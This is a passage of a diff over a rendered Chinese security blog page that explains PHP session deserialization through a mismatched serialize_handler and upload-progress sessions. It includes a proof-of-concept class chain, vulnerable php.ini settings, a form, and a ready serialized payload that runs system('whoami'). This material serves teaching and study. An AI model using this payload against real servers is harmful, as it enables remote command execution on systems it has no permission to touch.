+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>phpinfo.php</p>
 <div class="highlight"><div class="chroma">
@@ -602,15 +602,15 @@ session.serialize_handler = php   -- 定义用来序列化/反序列化的处理
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-    <span class="nx">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
-    <span class="nx">session_start</span><span class="p">();</span>
-    <span class="k">require</span><span class="p">(</span><span class="s2">&#34;./class.php&#34;</span><span class="p">);</span>
-    <span class="nv">$f3</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">foo3</span><span class="p">();</span>
-    <span class="nv">$f3</span><span class="o">-&gt;</span><span class="na">varr</span> <span class="o">=</span> <span class="s2">&#34;phpinfo();&#34;</span><span class="p">;</span>
-    <span class="nv">$f3</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
-<span class="o">?</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">session_start</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="k">require</span><span class="p">(</span><span class="s2">&#34;./class.php&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$f3</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">foo3</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$f3</span><span class="o">-&gt;</span><span class="na">varr</span> <span class="o">=</span> <span class="s2">&#34;phpinfo();&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$f3</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="o">?</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>可以看到，<code>index.php</code> 中用的是 <code>php</code> 处理器。</p>
 <p>在 <code>php.ini</code> 中的关键配置，注意配置中的<code>session.serialize_handler</code>：</p>
@@ -621,10 +621,10 @@ session.serialize_handler = php   -- 定义用来序列化/反序列化的处理
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-ini" data-lang="ini"><span class="na">session.serialize_handler</span><span class="o">=</span><span class="s">php_serialize</span>
-<span class="na">session.upload_progress.cleanup</span><span class="o">=</span><span class="s">Off</span>
-<span class="na">session.upload_progress.enabled</span><span class="o">=</span><span class="s">On</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-ini" data-lang="ini"><span class="line"><span class="cl"><span class="na">session.serialize_handler</span><span class="o">=</span><span class="s">php_serialize</span>
+</span></span><span class="line"><span class="cl"><span class="na">session.upload_progress.cleanup</span><span class="o">=</span><span class="s">Off</span>
+</span></span><span class="line"><span class="cl"><span class="na">session.upload_progress.enabled</span><span class="o">=</span><span class="s">On</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>可以访问 phpinfo.php 查看配置信息：</p>
 <p><img
@@ -671,33 +671,33 @@ session.serialize_handler = php   -- 定义用来序列化/反序列化的处理
 </span><span class="lnt">26
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-<span class="k">class</span> <span class="nc">foo3</span><span class="p">{</span>
-    <span class="k">public</span> <span class="nv">$varr</span><span class="p">;</span>
-    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
-        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">varr</span> <span class="o">=</span> <span class="s2">&#34;system(&#39;whoami&#39;);&#34;</span><span class="p">;</span>
-    <span class="p">}</span>
-<span class="p">}</span>
- 
-<span class="k">class</span> <span class="nc">foo2</span><span class="p">{</span>
-    <span class="k">public</span> <span class="nv">$varr</span><span class="p">;</span>
-    <span class="k">public</span> <span class="nv">$obj</span><span class="p">;</span>
-    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
-        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">varr</span> <span class="o">=</span> <span class="s1">&#39;1&#39;</span><span class="p">;</span>
-        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">obj</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">foo3</span><span class="p">();</span>
-    <span class="p">}</span>
-<span class="p">}</span>
- 
-<span class="k">class</span> <span class="nc">foo1</span><span class="p">{</span>
-    <span class="k">public</span> <span class="nv">$varr</span><span class="p">;</span>
-    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
-        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">varr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">foo2</span><span class="p">();</span>
-    <span class="p">}</span>
-<span class="p">}</span>
- 
-<span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">foo1</span><span class="p">());</span>
-<span class="cp">?&gt;</span><span class="err">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">foo3</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$varr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">varr</span> <span class="o">=</span> <span class="s2">&#34;system(&#39;whoami&#39;);&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">foo2</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$varr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$obj</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">varr</span> <span class="o">=</span> <span class="s1">&#39;1&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">obj</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">foo3</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">foo1</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$varr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">varr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">foo2</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">foo1</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>form.html，一个向 index.php 提交 POST 请求的表单文件，其中包括 PHP_SESSION_UPLOAD_PROGRESS 变量：</p>
 <div class="highlight"><div class="chroma">
@@ -709,12 +709,12 @@ session.serialize_handler = php   -- 定义用来序列化/反序列化的处理
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;http://127.0.0.1/i.php&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;POST&#34;</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&#34;multipart/form-data&#34;</span><span class="p">&gt;</span>     
-    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;PHP_SESSION_UPLOAD_PROGRESS&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;geekby&#34;</span> <span class="p">/&gt;</span>        
-    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;file&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;file&#34;</span> <span class="p">/&gt;</span>        
-    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="p">/&gt;</span>
-<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;http://127.0.0.1/i.php&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;POST&#34;</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&#34;multipart/form-data&#34;</span><span class="p">&gt;</span>     
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;PHP_SESSION_UPLOAD_PROGRESS&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;geekby&#34;</span> <span class="p">/&gt;</span>        
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;file&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;file&#34;</span> <span class="p">/&gt;</span>        
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Burpsuite 截断该 form.html 发送的 POST 请求，在 <code>PHP_SESSION_UPLOAD_PROGRESS</code> 一栏中的值加上 poc.php 生成的 poc 就能够成功执行命令了：</p>
 <p><code>|O:4:&quot;foo1&quot;:1:{s:4:&quot;varr&quot;;O:4:&quot;foo2&quot;:2:{s:4:&quot;varr&quot;;s:1:&quot;1&quot;;s:3:&quot;obj&quot;;O:4:&quot;foo3&quot;:1:{s:4:&quot;varr&quot;;s:19:&quot;system(&quot;whoami&quot;);&quot;;}}}</code></p>
@@ -746,7 +746,7 @@ session.serialize_handler = php   -- 定义用来序列化/反序列化的处理
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div>
     </footer></div>
 
